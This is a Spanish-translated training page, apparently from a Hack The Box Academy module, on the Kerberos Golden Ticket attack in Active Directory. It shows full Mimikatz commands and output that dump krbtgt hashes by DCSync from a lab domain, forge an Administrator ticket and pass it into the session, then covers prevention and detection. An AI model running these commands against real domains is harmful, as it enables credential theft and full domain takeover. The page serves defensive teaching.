# Golden Ticket

# **Descripción**

El`Kerberos Golden Ticket`es un ataque en el que los agentes de amenaza pueden crear/generar boletos para cualquier usuario en el dominio, por lo tanto, actuar de manera efectiva como controlador de dominio.

Cuando se crea un dominio, la cuenta de usuario única`krbtgt`se crea por defecto;`krbtgt`es una cuenta deshabilitada que no se puede eliminar, renombrar o habilitarse. El servicio KDC del controlador de dominio utilizará la contraseña de`krbtgt`para derivar una clave con la que firma todos los boletos de Kerberos. El hash de esta contraseña es el objeto más confiable en todo el dominio porque es cómo los objetos garantizan que el dominio del entorno emitió boletos Kerberos.

Por lo tanto,`any user`poseer el hash de la contraseña de`krbtgt`puede crear Kerberos TGTS válidos. Porque`krbtgt`Los firman, los TGT falsificados se consideran boletos válidos dentro de un entorno. Anteriormente, incluso era posible crear TGT para usuarios inexistentes y asignar cualquier privilegio a sus cuentas. Porque el hash de la contraseña de`krbtgt`Firma estos boletos, todo el dominio confía ciegamente en ellos, comportándose como si los usuarios existieran y poseían los privilegios inscritos en el boleto.

El`Golden Ticket`El ataque nos permite aumentar los derechos de cualquier dominio infantil a los padres en el mismo bosque. Por lo tanto, podemos escalar al dominio de producción de cualquier dominio de prueba que podamos tener, como lo es el dominio`not`un límite de seguridad.

Este ataque proporciona medios para la persistencia elevada en el dominio. Ocurre después de que un adversario ha ganado privilegios de administrador de dominio (o similares).

---

# **Ataque**

Para realizar el`Golden Ticket`ataque, podemos usar`Mimikatz`Con los siguientes argumentos:

- `/domain`: El nombre del dominio.
- `/sid`: El valor SID del dominio.
- `/rc4`: El hash de la contraseña de`krbtgt`.
- `/user`: El nombre de usuario para el cual`Mimikatz`emitirá el boleto (Windows 2019 bloquea los boletos si son para usuarios inexistentes).
- `/id`: ID relativo (última parte de`SID`) para el usuario para quien`Mimikatz`emitirá el boleto.

Además, los agentes de amenaza avanzada especificarán principalmente valores para el`/renewmax`y`/endin`argumentos, como de lo contrario,`Mimikatz`Generará el boleto con una vida de 10 años, lo que hace que sea muy fácil de detectar por EDRS:

- `/renewmax`: El número máximo de días se puede renovar el boleto.
- `/endin`: Al final de la vida para el boleto.

Primero, necesitamos obtener el hash de la contraseña de`krbtgt`y el`SID`valor del dominio. Podemos utilizar`DCSync`con la cuenta de Rocky del ataque anterior para obtener el hash:

Boleto dorado

```
C:\WINDOWS\system32>cd ../../../

C:\>cd Mimikatz

C:\Mimikatz>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /domain:eagle.local /user:krbtgt
[DC] 'eagle.local' will be the domain
[DC] 'DC1.eagle.local' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 07/08/2022 11.26.54
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: db0d0630064747072a7da3f7c3b4069e
    ntlm- 0: db0d0630064747072a7da3f7c3b4069e
    lm  - 0: f298134aa1b3627f4b162df101be7ef9

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b21cfadaca7a3ab774f0b4aea0d7797f

* Primary:Kerberos-Newer-Keys *
    Default Salt : EAGLE.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1335dd3a999cacbae9164555c30f71c568fbaf9c3aa83c4563d25363523d1efc
      aes128_hmac       (4096) : 8ca6bbd37b3bfb692a3cfaf68c579e64
      des_cbc_md5       (4096) : 580229010b15b52f

* Primary:Kerberos *
    Default Salt : EAGLE.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 580229010b15b52f

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  b4799f361e20c69c6fc83b9253553f3f
    02  510680d277587431b476c35e5f56e6b6
    03  7f55d426cc922e24269610612c9205aa
    04  b4799f361e20c69c6fc83b9253553f3f
    05  510680d277587431b476c35e5f56e6b6
    06  5fe31b1339791ab90043dbcbdf2fba02
    07  b4799f361e20c69c6fc83b9253553f3f
    08  7e08c14bc481e738910ba4d43b96803b
    09  7e08c14bc481e738910ba4d43b96803b
    10  b06fca48286ef6b1f6fb05f08248e6d7
    11  20f1565a063bb0d0ef7c819fa52f4fae
    12  7e08c14bc481e738910ba4d43b96803b
    13  b5181b744e0e9f7cc03435c069003e96
    14  20f1565a063bb0d0ef7c819fa52f4fae
    15  1aef9b5b268b8922a1e5cc11ed0c53f6
    16  1aef9b5b268b8922a1e5cc11ed0c53f6
    17  cd03f233b0aa1b39689e60dd4dbf6832
    18  ab6be1b7fd2ce7d8267943c464ee0673
    19  1c3610dce7d73451d535a065fc7cc730
    20  aeb364654402f52deb0b09f7e3fad531
    21  c177101f066186f80a5c3c97069ef845
    22  c177101f066186f80a5c3c97069ef845
    23  2f61531cee8cab3bb561b1bb4699cb9b
    24  bc35f896383f7c4366a5ce5cf3339856
    25  bc35f896383f7c4366a5ce5cf3339856
    26  b554ba9e2ce654832edf7a26cc24b22d
    27  f9daef80f97eead7b10d973f31c9caf4
    28  1cf0b20c5df52489f57e295e51034e97
    29  8c6049c719db31542c759b59bc671b9c

```

![](https://academy.hackthebox.com/storage/modules/176/A8/krbtgt.png)

Usaremos el`Get-DomainSID`función de[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)Para obtener el valor SID del dominio:

Boleto dorado

```powershell
PS C:\Users\bob\Downloads> powershell -exec bypass

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\bob\Downloads> . .\PowerView.ps1
PS C:\Users\bob\Downloads> Get-DomainSID
S-1-5-21-1518138621-4282902758-752445584

```

![](https://academy.hackthebox.com/storage/modules/176/A8/sid.png)

Ahora, armados con toda la información requerida, podemos usar`Mimikatz`Para crear un boleto para la cuenta`Administrator`. El`/ptt`el argumento hace`Mimikatz` [pasar el boleto a la sesión actual](https://adsecurity.org/?page_id=1821#KERBEROSPTT):

Boleto dorado

```
C:\Mimikatz>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt

User      : Administrator
Domain    : eagle.local (EAGLE)
SID       : S-1-5-21-1518138621-4282902758-752445584
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: db0d0630064747072a7da3f7c3b4069e - rc4_hmac_nt
Lifetime  : 13/10/2022 06.28.43 ; 13/10/2022 06.36.43 ; 13/10/2022 06.35.43
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ eagle.local' successfully submitted for current session

```

![](https://academy.hackthebox.com/storage/modules/176/A8/kerbTicket.png)

La salida muestra que`Mimikatz`inyectado el boleto en la sesión actual, y podemos verificarlo ejecutando el comando`klist`(Después de salir de`Mimikatz`):

Boleto dorado

```
mimikatz # exit

Bye!

C:\Mimikatz>klist

Current LogonId is 0:0x9cbd6

Cached Tickets: (1)

#0>     Client: Administrator @ eagle.local
        Server: krbtgt/eagle.local @ eagle.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 10/13/2022 13/10/2022 06.28.43 (local)
        End Time:   10/13/2022 13/10/2022 06.36.43 (local)
        Renew Time: 10/13/2022 13/10/2022 06.35.43 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

```

![](https://academy.hackthebox.com/storage/modules/176/A8/injectedTicket.png)

Para verificar que el boleto está funcionando, podemos enumerar el contenido del`C$`parte de`DC1`Usándolo:

Boleto dorado

```
C:\Mimikatz>dir \\dc1\c$

 Volume in drive \\dc1\c$ has no label.
 Volume Serial Number is 2CD0-9665

 Directory of \\dc1\c$

15/10/2022  08.30    <DIR>          DFSReports
13/10/2022  13.23    <DIR>          Mimikatz
01/09/2022  11.49    <DIR>          PerfLogs
28/11/2022  01.59    <DIR>          Program Files
01/09/2022  04.02    <DIR>          Program Files (x86)
13/12/2022  02.22    <DIR>          scripts
07/08/2022  11.31    <DIR>          Users
28/11/2022  02.27    <DIR>          Windows
               0 File(s)              0 bytes
               8 Dir(s)  44.947.984.384 bytes free

```

![](https://academy.hackthebox.com/storage/modules/176/A8/listDC1.png)

---

# **Prevención**

Prevenir la creación de boletos forjados es difícil como el`KDC`genera boletos válidos utilizando el mismo procedimiento. Por lo tanto, una vez que un atacante tiene toda la información requerida, puede forjar un boleto. Sin embargo, hay algunas cosas que podemos y debemos hacer:

- Bloquear a los usuarios privilegiados de la autenticación a cualquier dispositivo.
- Restablecer periódicamente la contraseña del`krbtgt`cuenta; El secreto de este valor hash es crucial para el directorio activo. Al restablecer la contraseña de`krbtgt`(independientemente de la fuerza de la contraseña), siempre se sobrescribirá con una nueva generada al azar y criptográficamente segura. Utilizando el script de Microsoft para cambiar la contraseña de`krbtgt` [Krbtgtkeys.ps1](https://github.com/microsoft/New-KrbtgtKeys.ps1)se recomienda muy recomendable, ya que tiene un modo de auditoría que verifica el dominio para prevenir los impactos al cambio de contraseña. También obliga a la replicación de DC en todo el mundo, por lo que todos los controladores de dominio sincronizan el nuevo valor al instante, reduciendo posibles interrupciones comerciales.
- Hacer cumplir`SIDHistory`filtrar entre los dominios en los bosques para evitar la escalada de un dominio infantil a un dominio principal (porque la ruta de escalada implica abusar del`SIDHistory`propiedad estableciéndolo en la de un grupo privilegiado, por ejemplo,`Enterprise Admins`). Sin embargo, hacer esto puede dar lugar a posibles problemas en los dominios migratorios.

---

# **Detección**

Correllar el comportamiento de los usuarios es la mejor técnica para detectar el abuso de boletos forjados. Supongamos que conocemos la ubicación y el tiempo que un usuario usa regularmente para iniciar sesión. En ese caso, será fácil alertar sobre otros comportamientos (sospechosos), por ejemplo, considere la cuenta 'Administrador' en el ataque descrito anteriormente. Si una organización madura usa`Privileged Access Workstations` (`PAWs`), deben estar alertas a cualquier usuario privilegiado que no se autentique de esas máquinas, monitoreando de manera proactiva los eventos con la ID`4624`y`4625`(Inicio de sesión exitoso y fallido).

Los controladores de dominio no registrarán eventos cuando un agente de amenazas forja un`Golden Ticket`de una máquina comprometida. Sin embargo, al intentar acceder a otros sistemas, veremos eventos para un inicio de sesión exitoso que se origina en la máquina comprometida:

![](https://academy.hackthebox.com/storage/modules/176/A8/logonAfterTickets.png)

Otro punto de detección podría ser un servicio TGS solicitado para un usuario sin un TGT anterior. Sin embargo, esta puede ser una tarea tediosa debido al gran volumen de boletos (y muchos otros factores). Si volvemos al escenario de ataque, corriendo`dir \\dc1\c$`Al final, generamos dos boletos TGS en el controlador de dominio:

# **Boleto 1:**

![](https://academy.hackthebox.com/storage/modules/176/A8/ticket1.png)

# **Boleto 2:**

![](https://academy.hackthebox.com/storage/modules/176/A8/ticket2.png)

La única diferencia entre los boletos es el servicio. Sin embargo, son ordinarios en comparación con los mismos eventos no asociados con el`Golden Ticket`.

Si`SID filtering`está habilitado, recibiremos alertas con la identificación del evento`4675`Durante la escalada cruzada.

---

# **Nota**

Si se ha comprometido un bosque de Active Directory, necesitamos restablecer las contraseñas de todas las contraseñas de los usuarios y revocar todos los certificados, y para`krbtgt`, debemos restablecer su contraseña dos veces (en`every domain`). El valor del historial de contraseña para el`krbtgt`La cuenta es 2. Por lo tanto, almacena las dos contraseñas más recientes. Al restablecer la contraseña dos veces, efectivamente eliminamos cualquier contraseña antigua del historial, por lo que no hay forma de que otro DC replique este DC utilizando una contraseña antigua. Sin embargo, se recomienda que este restablecimiento de contraseña se produzca al menos 10 horas separadas entre sí (vida útil máxima del boleto de usuario); De lo contrario, espere que algunos servicios se rompan si se realizan en un período más corto.